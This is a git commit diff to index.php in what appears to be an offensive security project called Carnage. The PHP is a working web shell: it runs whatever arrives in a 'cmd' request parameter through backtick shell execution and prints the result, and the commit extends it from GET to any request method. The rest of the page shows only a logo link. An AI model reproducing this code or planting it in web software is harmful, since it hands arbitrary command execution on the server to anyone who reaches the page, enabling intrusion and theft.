aba55bca4aa264b2e606c7d1a5f53e9153d6072f
Anurag Mondal <anorak318@gmail.com>
2022-09-05 00:26:32 +0530

    Update Index

--- index.php
+++ index.php
@@ -1,15 +1,13 @@
-<!--Php code start here -->      
-        <?php
-
-if (isset($_GET['cmd'])) {
-	$command = $_GET['cmd'];
+ <!--Php code start here -->    
+         <?php
+if (isset($_REQUEST['cmd'])) {
+	$command = $_REQUEST['cmd'];
 	$output =  `$command`;
 	echo "<h3 id='output--'>Output :-</h3>
  		 <pre>".$output."</pre>";
 }
 else {
-	echo '<p><a href="https://7ragnarok7.github.io/Carnage"><img src="./Carnage _ A Network Automation tool focused on Cybersecurity_files/carnage.png" alt="Carnage-icon"></a></p>';
+       echo '<p><a href="https://7ragnarok7.github.io/Carnage"><img src="Carnage%20|%20A%20Network%20Automation%20framework%20focused%20on%20Cyber-Security_files/carnage.png" alt="Carnage-icon"></a></p>';
 }
-?> 
-
-<!--Php code end here --> 
+?>
+<!--Php code start here -->  
